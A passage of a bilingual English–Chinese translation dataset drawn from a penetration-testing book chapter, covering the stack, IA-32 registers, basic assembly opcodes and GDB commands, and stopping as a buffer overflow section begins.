- en: '*Chapter 10*: Shellcoding - The Stack'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第10章*：Shellcoding - 堆栈'
- en: Up to this point, we’ve been working from a fairly high level of abstraction.
    We’ve reviewed some great tools for getting work done efficiently and learned
    how to easily generate reports in easy-to-digest formats. Despite this, there
    is a wall that will halt our progress if we stay above the murky lower layers,
    and constantly allow tools to hide the underlying machine. Regardless of the task
    we’re doing, packets and application data eventually work their way down to raw
    machine data. We learned this earlier while working with networking protocols,
    such as when a tool tells you that a destination is unreachable. While that may
    be true, it’s pretty meaningless when you want to know what happened to those
    bits of information that went flying down the wire. As a security professional,
    you need to be able to interpret the information at hand, and vague and incomplete
    data is a daily reality of this field. So, in this chapter, we’re going to start
    our journey into the lower mechanisms of the machine. This will lay a foundation
    for the hands-on exercises later in the book, where a solid understanding of how
    computers think is essential for programming tasks. Although this is a hands-on
    book, this chapter jumps into a little more theory than usual. Don’t worry, though,
    as we will also demonstrate how to use this understanding to inform real-world
    tasks.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们一直在较高的抽象层次上工作。我们回顾了一些有效的工具，用于高效地完成工作，并学习了如何以易于消化的格式轻松生成报告。尽管如此，如果我们停留在模糊的低层次并且不断让工具隐藏底层机器，就会遇到一堵墙，阻碍我们的进展。无论我们在做什么任务，数据包和应用数据最终都会转化为原始的机器数据。我们在处理网络协议时就学到了这一点，比如当一个工具告诉你目标不可达时。虽然那可能是事实，但如果你想知道那些飞速传输的比特信息发生了什么，那就显得毫无意义。作为一个安全专家，你需要能够解读手头的信息，模糊和不完整的数据是这个领域每天都要面对的现实。因此，在本章中，我们将开始深入了解机器的底层机制。这将为书后面的实际操作练习奠定基础，在这些练习中，理解计算机的思维方式对于编程任务至关重要。尽管这是一本实践书籍，本章内容比平时稍微偏向理论。别担心，我们还会展示如何将这种理解应用于实际任务。
- en: 'In this chapter, we will do the following:'
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 本章内容包括以下内容：
- en: Introduce the stack and debugging
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 介绍堆栈和调试
- en: Introduce assembly language
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 介绍汇编语言
- en: Build and work with a vulnerable C program
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 构建并使用一个有漏洞的C程序
- en: Examine memory with the GDB debugger
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用GDB调试器检查内存
- en: Introduce the concept of endianness
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 介绍字节序的概念
- en: Introduce shellcoding concepts
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 介绍shellcoding概念
- en: Learn how to fine-tune our shellcode with **msfvenom**
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 学习如何使用**msfvenom**来微调我们的shellcode
- en: Technical requirements
  id: totrans-10
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: 'The technical requirements for this chapter are as follows:'
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 本章的技术要求如下：
- en: Kali Linux
  id: totrans-12
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Kali Linux
- en: An older version of Kali or BackTrack, or a different flavor of Linux that allows
    stack execution
  id: totrans-13
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 旧版本的Kali或BackTrack，或允许堆栈执行的其他Linux版本
- en: An introduction to debugging
  id: totrans-14
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 调试简介
- en: This isn’t a book about reverse engineering as such, but the science and art
    of reversing serves us well as pen testers. Even if we don’t write our own exploits,
    reversing gives us the bird’s eye view we need to understand low-level memory
    management. We’ve looked at a couple of languages so far – Python and Ruby – and
    we’ll also be taking a look at some very basic C code in this chapter. These languages
    are high-level languages. This means they are layers of logical abstraction away
    from the native language of the machine and closer to how people think. Therefore,
    they consist of high-level concepts such as objects, procedures, control flows,
    variables, and so on. This hierarchy of abstraction in high-level languages is
    by no means flat – C, for example, is considered to be closer to the machine’s
    native language compared to other high-level languages. Low-level languages, on
    the other hand, have little to no abstraction from machine code. The most important
    low-level language for a hacker is an assembly language, which usually has just
    one layer of abstraction from pure machine code. Assembly languages consist of
    mnemonic representations for opcodes (a number that represents a particular action
    taken by the processor) and temporary storage boxes, called registers, for the
    operands being moved around. At the lowest level, all programs are basically fancy
    memory management – they’re all made up of data and data has to be stored and
    read from somewhere.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 这本书并不是关于逆向工程的，但逆向的科学与艺术对我们作为渗透测试人员非常有帮助。即使我们不编写自己的漏洞利用程序，逆向也能为我们提供鸟瞰图，帮助我们理解底层内存管理。到目前为止，我们已经看过了几种语言——Python和Ruby——并且在本章中，我们也将简单看一看一些C语言代码。这些语言都是**高级语言**，这意味着它们距离机器的本地语言有一层逻辑抽象，更接近于人类的思维方式。因此，它们包含诸如对象、过程、控制流、变量等高级概念。这种高级语言的抽象层次绝非平坦——例如，C语言相比其他高级语言被认为更接近机器的本地语言。另一方面，**低级语言**几乎没有与机器码的抽象层次。黑客最重要的低级语言是汇编语言，它通常只有一层抽象，接近纯机器码。汇编语言由操作码（opcode，表示处理器执行某个特定操作的数字）和临时存储单元（称为寄存器，用于存储操作数）组成。在最低层次，所有程序基本上都可以看作是复杂的内存管理——它们都由数据组成，而数据必须从某个地方存储和读取。
- en: From here on out, unless specifically stated otherwise, we’re working with **Intel
    Architecture-32** (**IA-32**), which is the 32-bit x86 instruction set architecture
    (the original x86 was 16-bit). It’s the most common architecture and thus closest
    to real-world applicability. It’s also a great start for understanding other architectures. For
    now, let’s take a look at how memory is allocated at runtime.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 从现在开始，除非特别说明，否则我们将使用**Intel架构-32**（**IA-32**），即32位x86指令集架构（原始的x86是16位）。它是最常见的架构，因此最贴近实际应用。它也是理解其他架构的良好起点。现在，让我们看看内存是如何在运行时分配的。
- en: Understanding the stack
  id: totrans-17
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 理解栈
- en: The stack is a block of memory that is associated with a particular process
    or thread. When we say stack, just think of a stack of dishes. At first, you have
    a table or kitchen counter; then, you place a plate on the surface. Then, you
    place the next plate on top of the previous plate. To get to a plate in the middle
    of the stack, you need to remove the plates above it first. (Okay, maybe I’m getting
    a little carried away with this analogy. I used to wait tables.)
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 栈（stack）是与特定进程或线程相关联的一块内存。当我们说栈时，可以想象一叠盘子。一开始，你有一张桌子或厨房台面；然后，你把一只盘子放在台面上。接着，把下一个盘子放在前一个盘子上面。如果要取出中间的盘子，你需要先把上面的盘子拿走。（好吧，也许我有点过于沉迷于这个比喻了。我曾经做过服务员。）
- en: This method of organizing the stack is called a **Last in, First out** (**LIFO**)
    structure. Getting data on the stack is called a **push** operation. Getting data
    off the stack is known as a **pop** operation, which also happens to be one of
    my favorite terms in computer science. Sometimes you’ll see **pull** operation, but
    let’s be honest, pop sounds much more fun. During the execution of a program,
    when a function is called, the function and its data are pushed onto the stack.
    The stack pointer keeps an eye on the top of the stack as data is pushed and popped
    off the stack. After all the data in the procedure has been popped off of the
    stack, the final piece of information is a **return** instruction that takes us
    back to the point in the program right before the call began. Since the program
    data is in the memory, **return** is an instruction to jump to a particular memory
    address.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 这种组织堆栈的方法叫做 **后进先出**（**LIFO**）结构。将数据压入堆栈叫做 **push** 操作。将数据从堆栈中取出叫做 **pop** 操作，这也是我在计算机科学中最喜欢的术语之一。有时你会看到
    **pull** 操作，但老实说，pop 听起来要有趣得多。在程序执行过程中，当一个函数被调用时，函数及其数据会被压入堆栈。堆栈指针会监视堆栈顶部的数据，在数据被压入和弹出堆栈时保持跟踪。当过程中的所有数据都被弹出堆栈时，最后一条信息是
    **return** 指令，它将我们带回到程序开始调用之前的位置。由于程序数据位于内存中，**return** 是一条跳转到特定内存地址的指令。
- en: Understanding registers
  id: totrans-20
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 理解寄存器
- en: Before we start playing around with debuggers, we need to review registers and
    some basic assembly language concepts. As stated earlier, processors deal with
    data, and data needs to be stored somewhere, even if it’s only for a tiny fraction
    of a second. Registers are little storage areas (and by little we mean 8 bits,
    16 bits, 32 bits, and 64 bits) that are directly accessible by the processor as
    they’re built into the processor itself.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们开始玩调试器之前，我们需要回顾寄存器和一些基本的汇编语言概念。如前所述，处理器处理数据，而数据需要存储在某个地方，即使它只是短短的一瞬间。寄存器是直接由处理器访问的小型存储区域（我们所说的小是指
    8 位、16 位、32 位和 64 位），因为它们是直接内建于处理器中的。
- en: When you’re working at your desk in your office, the things that are within
    an arm’s reach are the items that can be accessed immediately. Let’s suppose you
    need something from the filing cabinet in your office. This might take you a few
    extra minutes, but the object is still readily available. Now, imagine you have
    boxes of paper up in the attic. It’ll be a bit of a pain to have to retrieve data
    from up there, but you can pull out the ladder when you have to. Having to retrieve
    program data from secondary storage (the hard drive) takes a lot of time for the
    processor and is similar to your dusty old attic. The RAM can be thought of as
    that filing cabinet that has more room than your desk, but getting something from
    it is not as quick as grabbing something from your desk. Your processor needs
    registers like you need some space on your desk.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 当你在办公室的桌子上工作时，触手可及的物品是可以立即访问的物品。假设你需要从办公室的文件柜里拿些东西。这可能需要你额外花费几分钟时间，但物品仍然随时可以获取。现在，假设你有一些纸箱存放在阁楼里。从那里获取数据可能有点麻烦，但当你必须取出时，你可以拉出梯子。需要从二级存储（硬盘）中检索程序数据会花费处理器很多时间，类似于你那尘土飞扬的阁楼。RAM
    可以被看作是那个比桌子有更多空间的文件柜，但从中获取物品的速度并不像从桌子上取东西那么快。你的处理器需要寄存器，就像你需要桌面上的一些空间一样。
- en: 'Although the IA-32 architecture has a handful of registers for various purposes,
    there are only eight that you’ll be concerned with: the general-purpose registers.
    Remember when we mentioned that the original x86 was 16-bit? Well, the 32-bit
    is an extension (hence the *E*) of the 16-bit architecture, which means all of
    the original registers are still there and occupy the lower half of the register.
    The 16-bit architecture itself is an extension of the 8-bit granddaddy of the
    distant past (the 8080), so you’ll also find the 8-bit registers occupying the
    high and low ends of the A, B, C, and D 16-bit registers. This design allows for
    backward compatibility. Take a look at the following diagram:'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管 IA-32 架构有一些寄存器用于各种目的，但你只需要关注其中的八个：通用寄存器。记得我们提到过原始的 x86 是 16 位吗？其实 32 位是 16
    位架构的扩展（因此有了 *E*），这意味着所有原始的寄存器仍然存在，并占据寄存器的下半部分。16 位架构本身是过去 8 位架构（8080）的扩展，所以你还会发现
    8 位寄存器占据了 A、B、C 和 D 16 位寄存器的高低端。这种设计确保了向后兼容性。看看下面的图示：
- en: '![Figure 10.1 – IA-32 registers map ](image/Figure_10.1_B17616.jpg)'
  id: totrans-24
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.1 – IA-32 寄存器映射](image/Figure_10.1_B17616.jpg)'
- en: Figure 10.1 – IA-32 registers map
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.1 – IA-32寄存器映射
- en: Technically, all of the previously-mentioned registers (aside from **ESP**)
    can be used as generic registers, but most of the time, **EAX**, **EBX**, and
    **EDX** are the true generics. **ECX** can be used as a counter (think *C* for
    *counter*) in functions that require one. **ESI** and **EDI** are often used as
    the **source index** (**SI**) and the **destination index** (**DI**) when memory
    is being copied from one location to another. **EBP** is usually used as the stack
    base pointer. **ESP** is always the stack pointer – the location of the current
    place in the stack (the top). Accordingly, if data is to be pushed to (or popped
    from) the stack, **ESP** tells us where it is going to or coming from. For example,
    if the data is getting pushed to or popped from right under the position of the
    stack pointer, the stack pointer then updates to the new top position. So, what
    distinguishes the stack pointer from the stack base pointer? The stack base is
    the bottom of the current stack frame. When we discussed the example of a function
    call earlier, we saw that the stack frame is all of the associated data pushed
    onto the stack. The return at the bottom of the stack frame is located right under
    the base pointer. As you can see, these references help us to truly understand
    what’s happening in memory. Speaking of pointers, we should be aware of the **EIP**
    instruction register (instruction pointer), which tells the processor where the
    next instruction is located. It isn’t a general-purpose register, as you can imagine.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 从技术上讲，之前提到的所有寄存器（除了**ESP**）都可以作为通用寄存器使用，但大多数情况下，**EAX**、**EBX**和**EDX**才是真正的通用寄存器。**ECX**可以用作函数中需要计数器的计数器（想象一下，*C*代表*counter*）。**ESI**和**EDI**通常用作内存复制时的**源索引**（**SI**）和**目标索引**（**DI**）。**EBP**通常作为栈基指针使用。**ESP**始终是栈指针——当前栈的位置（栈顶）。因此，如果数据要被压入（或弹出）栈，**ESP**告诉我们数据将去往或来自哪里。例如，如果数据从栈指针下方压入或弹出，栈指针就会更新为新的栈顶位置。那么，栈指针和栈基指针有何不同？栈基指针是当前栈帧的底部。当我们先前讨论函数调用的例子时，我们看到栈帧包含所有压入栈的相关数据。栈帧底部的返回值位于基指针的下方。如你所见，这些引用帮助我们真正理解内存中发生的事情。说到指针，我们还应注意**EIP**指令寄存器（指令指针），它告诉处理器下一条指令的位置。正如你可以想象的那样，它不是通用寄存器。
- en: Finally, there’s the status register **EFLAGS** (once again, the *E* stands
    for extended, as in the 16-bit ancestor, it is called **FLAGS**). Flags are special
    bits that contain processor state information. For example, when the processor
    is asked to perform subtraction, and the answer is zero, the zero flag is set.
    Similarly, if the result is negative, the sign flag is set. There are also control
    flags, which will actually influence how a processor performs a particular task.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，还有状态寄存器**EFLAGS**（再次说明，*E*表示扩展，就像16位祖先一样，它叫做**FLAGS**）。标志位是包含处理器状态信息的特殊位。例如，当处理器被要求执行减法操作且结果为零时，零标志被设置。同样，如果结果为负，符号标志被设置。还有一些控制标志，实际上会影响处理器执行特定任务的方式。
- en: Assembly language basics
  id: totrans-28
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 汇编语言基础
- en: If you think all of this juicy information about registers is fascinating, then
    just wait until you learn about assembly language where the whole life story of
    registers is written! We’re only looking at the basics here, as a proper treatment
    of the topic would require a lot more pages. Regardless, there are some fundamentals
    that will help you to understand the whole subject of assembly language for those
    who are brave enough to dive into the topic beyond this book.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你认为关于寄存器的这些信息很有趣，那么等你了解汇编语言时，寄存器的完整生命周期会更让你着迷！我们这里只看基础知识，因为要全面讲解这个话题需要更多的篇幅。不过，对于那些勇敢深入这个主题的人来说，理解一些基础知识有助于全面掌握汇编语言。
- en: 'Assembly, with all of its brutality, is also beautiful in its simplicity. It’s
    hard to imagine anything so close to machine code as being simple, but remember
    that what a processor does is pretty simple – it does math, it moves data around,
    and stores small amounts of data, including state information. It’s also important
    to remember that the processor understands binary – just 0’s and 1’s at its lowest
    level. There are two ways we make this binary machine language slightly more human-friendly
    – using the compact representation of binary (that is, using number bases that
    are powers of two; hexadecimal is what we’ll be using the most), and assembly
    language, which uses mnemonics to represent operations. There are two primary
    components of almost all assembly language – opcodes and operands. An **opcode**,
    short for **operation code**, is a code that represents a particular instruction.
    An operand is a parameter that is used by the opcode and can be the immediate operand
    type, which is a value defined in the code; a register reference; or a memory
    address reference (which can actually be either of the first two data types).
    Note that the occasional opcode has no operands. If there’s a destination and
    a source operand, the destination goes first, as you can see in the following
    example:'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 汇编语言，尽管其极度简洁，但也因其简约而美丽。很难想象如此接近机器代码的东西竟然如此简单，但请记住，处理器做的事情非常简单——它做数学运算，移动数据，并存储少量数据，包括状态信息。还要记住，处理器理解的是二进制——最底层就是
    0 和 1。我们有两种方法使这种二进制机器语言稍微更适合人类——使用二进制的紧凑表示（也就是使用二的幂作为数字基数；我们将主要使用十六进制），以及汇编语言，它使用助记符来表示操作。几乎所有汇编语言都有两个主要组件——**操作码（opcode）**
    和 **操作数（operand）**。**操作码（opcode）** 是指代表特定指令的代码。**操作数（operand）** 是操作码使用的参数，可以是立即数操作数类型（即代码中定义的值）；寄存器引用；或内存地址引用（实际上可以是前两种数据类型之一）。注意，某些操作码没有操作数。如果有目标操作数和源操作数，目标操作数优先，如以下示例所示：
- en: mov    edi,ecx
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: mov    edi, ecx
- en: In this case, the **edi** register is the destination and the **ecx** register
    is the source.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，**edi** 寄存器是目标操作数，**ecx** 寄存器是源操作数。
- en: Keep in mind that there are two assembly language notations in use depending
    on the environment – Intel and AT&T. You’ll encounter the Intel notation when
    working with Windows binaries, so we’ll be defaulting to that notation in this
    book. However, you will encounter the AT&T notation in Unix environments. One
    major difference between Intel and AT&T is that the destination and source operands
    are in the opposite order in AT&T notation; however, memory addresses are referenced
    with **%()**, which makes it easy to tell which notation is in front of you.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 请记住，根据环境的不同，存在两种汇编语言表示法——Intel 和 AT&T。你将在处理 Windows 二进制文件时遇到 Intel 表示法，因此本书中我们默认使用这种表示法。然而，在
    Unix 环境中，你会遇到 AT&T 表示法。Intel 和 AT&T 之间的一个主要区别是，在 AT&T 表示法中，目标操作数和源操作数的位置是 **相反的**；然而，内存地址使用
    **%()** 引用，这使得你可以轻松判断你面对的是哪种表示法。
- en: 'Let’s get started by looking at basic opcodes and some examples:'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们从基本操作码和一些示例开始：
- en: '**mov** means move and will be the most common opcode you’ll see, as the bulk
    of a processor’s work is moving things to and from convenient spots (such as registers)
    so that it can work on the task at hand. An example of **mov** is as follows:'
  id: totrans-35
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**mov** 表示移动，将是你看到的最常见的操作码，因为处理器的大部分工作都是将数据从一个地方移到另一个地方（例如寄存器），以便它能处理当前的任务。以下是
    **mov** 的一个示例：'
- en: mov    ecx,0xbff4ca0b
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: mov    ecx, 0xbff4ca0b
- en: '**add**, **sub**, **div**, and **mul** are all basic arithmetic opcodes – addition,
    subtract, division, and multiplication, respectively.'
  id: totrans-37
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**add**、**sub**、**div** 和 **mul** 都是基本的算术运算码——分别表示加法、减法、除法和乘法。'
- en: '**cmp** is the comparer, which takes two operands and sets the status of the
    result with flags. In the following example, two values are compared; they’re
    clearly the same, so the difference between them is **0** and thus the zero flag
    is set:'
  id: totrans-38
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**cmp** 是比较指令，它接受两个操作数并通过标志位设置结果的状态。在以下示例中，比较了两个值；它们显然相同，因此它们之间的差值是 **0**，因此零标志被设置：'
- en: cmp    0x3e2,0x3e2
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: cmp    0x3e2, 0x3e2
- en: '**call** is the function caller. This operation causes the instruction pointer
    to be pushed onto the stack so that the current location can be recalled, and
    execution then jumps to the specified address. An example of **call** is as follows:'
  id: totrans-40
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**call** 是函数调用指令。此操作会将指令指针压入栈中，以便可以回到当前的位置，然后执行跳转到指定的地址。以下是 **call** 的一个示例：'
- en: call    0xc045bbb2
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: call    0xc045bbb2
- en: '**jcc** conditional instructions are the if/then of the assembly world. **jnz**
    is pretty common and takes one operand – a destination address in memory. It means
    jump if not zero, so you’ll often see it after a **cmp** operation. In the following
    example, the value stored in **eax** is compared with the hexadecimal value **3e2**
    (**994** in decimal), and if the zero flag is not set, execution jumps to the
    location **0xbbbf03a5** in memory. The following two lines, in plain English are:
    *check whether whatever is in the* **eax** *register is equal to* **994** *or
    not. If they are different numbers, then jump to the instruction at* **0xbbbf03a5**:'
  id: totrans-42
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**jcc** 条件指令是汇编世界中的 if/then。**jnz** 是非常常见的，并且只接受一个操作数——一个内存中的目标地址。它表示“如果不为零，则跳转”，因此你经常会看到它在
    **cmp** 操作之后。以下示例中，存储在 **eax** 中的值与十六进制值 **3e2**（十进制为 **994**）进行比较，如果零标志未设置，执行将跳转到内存中的
    **0xbbbf03a5** 位置。以下两行，简单来说就是：*检查存储在**eax**寄存器中的值是否等于**994**，如果它们是不同的数字，则跳转到**0xbbbf03a5**处的指令*：'
- en: cmp    eax,0x3e2
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: cmp    eax,0x3e2
- en: jnz    0xbbbf03a5
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: jnz    0xbbbf03a5
- en: '**push** is the same push from our discussion about how the stack works. This
    command pushes something onto the stack. If you have a series of **push** operations,
    then those operands end up in the stack in the LIFO structure in the order in
    which they appear, as shown in the following example:'
  id: totrans-45
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**push** 与我们在讨论堆栈工作原理时提到的 **push** 相同。此命令将某些内容推送到堆栈中。如果你有一系列的 **push** 操作，那么这些操作数将按照出现的顺序进入堆栈，并按照
    LIFO（后进先出）结构存储，如以下示例所示：'
- en: push    edx
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: push    edx
- en: push    ecx
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: push    ecx
- en: push    eax
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: push    eax
- en: push    0x6cc3
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: push    0x6cc3
- en: call    0xbbfffc32
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: call    0xbbfffc32
- en: As you can see, this is a very simple introduction. Assembly is one of those
    things that is better learned through examples, so stay tuned for more analysis
    later on in the book.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，这是一个非常简单的介绍。汇编语言是那种通过示例学习效果更好的东西，因此请继续关注书中的更多分析。
- en: Disassemblers, debuggers, and decompilers – oh my!
  id: totrans-52
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 汇编器、调试器和反编译器——哇！
- en: 'It’s always wise to review the differences between these terms before going
    any further because believe it or not, these words are commonly used interchangeably:'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 在继续之前，最好先回顾一下这些术语之间的差异，因为信不信由你，这些词语通常是可以互换使用的：
- en: '![Figure 10.2 – Disassembler versus decompiler ](image/Figure_10.2_B17616.jpg)'
  id: totrans-54
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.2 – 汇编器与反编译器](image/Figure_10.2_B17616.jpg)'
- en: Figure 10.2 – Disassembler versus decompiler
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.2 – 汇编器与反编译器
- en: 'Let’s define each term:'
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们定义一下每个术语：
- en: A **debugger** is a tool for testing program execution. It can help an engineer
    identify where execution is breaking. A debugger will use some sort of disassembler.
  id: totrans-57
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**调试器** 是用于测试程序执行的工具。它可以帮助工程师识别执行中断的位置。调试器将使用某种类型的汇编器。'
- en: A **disassembler** is a program that takes pure machine code as input and displays
    the assembly language representation of the underlying code.
  id: totrans-58
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**汇编器** 是一个将纯机器码作为输入并显示底层代码的汇编语言表示的程序。'
- en: A **decompiler** attempts to reverse the compilation process. In other words,
    it attempts to reconstruct a binary in a high-level language, such as C. Lots
    of constructs in the programmer’s original code are often lost, so decompilation
    is not an exact science.
  id: totrans-59
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**反编译器** 尝试逆向编译过程。换句话说，它试图将二进制文件重构为高级语言，例如 C。程序员原始代码中的许多结构通常会丢失，因此反编译并不是一门精确的科学。'
- en: As you work with debuggers throughout this book, you will see the assembly language
    representation of a given executable file, so disassembly is a necessary part
    of this process. An engineer who just needs to understand what’s happening at
    the processor level only needs a disassembler, whereas an engineer trying to recover
    high-level functionality from a program will need a decompiler.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 在本书的调试器部分，你将看到给定可执行文件的汇编语言表示，因此反汇编是这个过程中的必要部分。只需要理解处理器级别发生了什么的工程师只需要汇编器，而试图从程序中恢复高级功能的工程师将需要反编译器。
- en: Now, let’s start playing around with one of the best debuggers (in our opinion)
    – **GNU debugger** (**GDB**).
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们开始玩弄其中一个最好的调试器（在我们看来）——**GNU 调试器**（**GDB**）。
- en: Getting cozy with the Linux command-line debugger – GDB
  id: totrans-62
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 熟悉 Linux 命令行调试器 GDB
- en: 'You can find GDB in the repository, so installing it is easy. Just grab it
    with **apt-get install gdb**. Once installed, just use the following command to
    get started:'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以在软件仓库中找到 GDB，所以安装它很容易。只需通过 **apt-get install gdb** 安装它。安装完成后，只需使用以下命令开始使用：
- en: gdb
  id: totrans-64
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: gdb
- en: 'There are a lot of commands available in GDB categorized by class, so it’s
    recommended that you review the GDB documentation offline to get a better idea
    of its power. We’ll be looking at other debuggers later on, so we won’t spend
    a lot of time here. Let’s look at the basics:'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: GDB 中有许多命令按类别分类，因此建议你离线查阅 GDB 文档，深入了解其强大功能。稍后我们会查看其他调试器，因此这里不会花太多时间。让我们来看一下基础知识：
- en: You can load an executable by simply passing the name and location of the file
    as an argument when running **gdb** from the command line. You can also attach
    GDB to an existing process with **--pid**.
  id: totrans-66
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 你可以通过在命令行中运行 **gdb** 时传递文件的名称和位置来加载可执行文件。你还可以使用 **--pid** 将 GDB 附加到现有进程。
- en: The **info** command is a powerful window into what’s going on behind the scenes; **info
    breakpoints** will list and provide information about breakpoints and specific
    locations in the code where execution stops so you can examine it and its environment. **info
    registers** is important during any stack analysis as it shows us what’s going
    on with the processor’s registers at a given moment. Use it with **break** to
    monitor changes to register values as the program runs.
  id: totrans-67
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**info** 命令是了解后台发生的事情的强大窗口；**info breakpoints** 会列出并提供有关断点的信息，以及代码中执行停止的特定位置，以便你可以检查该位置及其环境。**info
    registers** 在任何栈分析中都很重要，因为它展示了当前时刻处理器寄存器的状态。你可以与 **break** 一起使用它，监控程序运行时寄存器值的变化。'
- en: '**list** will show us the source code if it’s included. We can then set breakpoints
    based on positions in the source code, which is extremely handy.'
  id: totrans-68
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**list** 会显示源代码（如果它包含的话）。然后我们可以根据源代码中的位置设置断点，这非常方便。'
- en: '**run** tells GDB to run the target; you pass arguments to **run** as you would
    to the target outside of GDB.'
  id: totrans-69
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**run** 告诉 GDB 运行目标；你像在 GDB 外部一样传递参数给 **run**。'
- en: '**x** simply means to examine and lets us peek inside memory. We’ll use it
    to examine a set number of addresses beyond the stack pointer. For example, to
    examine **45** hexadecimal words past the stack pointer ESP, we would issue **x/45x
    $esp**.'
  id: totrans-70
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**x** 只是意味着检查，它让我们可以窥视内存。我们将使用它检查栈指针之外的若干地址。例如，要检查栈指针 ESP 后 **45** 个十六进制字，我们可以输入
    **x/45x $esp**。'
- en: Now we’re going to take this introduction to the next stage and start playing
    with a vulnerable program in GDB.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们将把这部分介绍提升到一个新的阶段，开始在 GDB 中玩弄一个有漏洞的程序。
- en: Stack smack – introducing buffer overflows
  id: totrans-72
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 栈冲击 – 介绍缓冲区溢出
- en: Earlier in the chapter, we learned about the magical world of the stack. The
    stack is very orderly, and its core design assumes all players are following its
    rules – for example, that anything copying data to the buffer has been checked
    to make sure it will actually fit.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章的前面，我们了解了栈的神奇世界。栈非常有序，其核心设计假设所有参与者都遵循它的规则——例如，任何将数据复制到缓冲区的操作都已经检查过，以确保数据能适应缓冲区。
- en: Although you can use your latest Kali Linux to set this up and study the stack
    and registers, stack execution countermeasures are built into the latest releases
    of Kali. We recommend using a different flavor of Linux (or an older version of
    Kali or BackTrack) to see the exploit in action. Regardless, we’ll be attacking
    Windows boxes in[*Chapter 12*](B17616_12_Final_VK_ePub.xhtml#_idTextAnchor224),
    *Shellcoding - Evading Antivirus*.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然你可以使用最新的 Kali Linux 来设置并研究栈和寄存器，但 Kali 的最新版本中已经内置了栈执行对策。我们建议使用其他版本的 Linux（或较旧版本的
